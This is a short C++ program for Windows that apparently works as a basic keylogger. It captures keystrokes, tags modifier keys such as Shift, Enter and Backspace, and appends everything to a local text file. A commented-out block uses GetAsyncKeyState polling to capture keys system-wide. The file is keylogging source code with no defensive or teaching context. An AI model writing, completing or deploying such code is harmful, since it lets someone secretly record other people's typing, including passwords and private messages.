#include <iostream>
#include <windows.h>
#include <conio.h>
#include <fstream>

using namespace std;

int keys(char key, fstream&);

int main(){

  char key_press;
  int ascii_value;

  fstream afile;

  afile.open("key_file.txt", ios::in | ios::out);
  afile.close();

  while(true){

    /* Block 1 Starts */
    key_press = getch();
    ascii_value = key_press;
    cout << "Here --> " << key_press << endl;
    // cout << "Async --> " << ascii_value << endl;
    if(7 < ascii_value && ascii_value < 256){
      keys(key_press, afile);
    }
    /* Block 1 Ends */


    /* Block 2 Starts */

    // for(int i=8; i<256; i++){
    //   if(GetAsyncKeyState(i) == -32767){
    //     keys(i, afile);
    //   }
    // }

    /* Block 2 Ends */
  }
  return 0;
}

int keys(char key, fstream& file){

  file.open("key_file.txt", ios::app | ios::in | ios::out);
  if(file){
    if(GetAsyncKeyState(VK_SHIFT)){
      file << "[SHIFT]";
    }
    else if(GetAsyncKeyState(VK_ESCAPE)){
      file << "[ESCAPE]";
    }
    else if(GetAsyncKeyState(VK_RETURN)){
      file << "[ENTER]";
    }
    else if(GetAsyncKeyState(VK_CONTROL)){
      file << "[CONTROL]";
    }
    else if(GetAsyncKeyState(VK_MENU)){
      file << "[ALT]";
    }
    else if(GetAsyncKeyState(VK_DELETE)){
      file << "[DELETE]";
    }
    else if(GetAsyncKeyState(VK_TAB)){
      file << "[TAB]";
    }
    else if(GetAsyncKeyState(VK_BACK)){
      file << "[BACKSPACE]";
    }
    else{
      file << key;
    }
  }

  file.close();

  return 0;
}
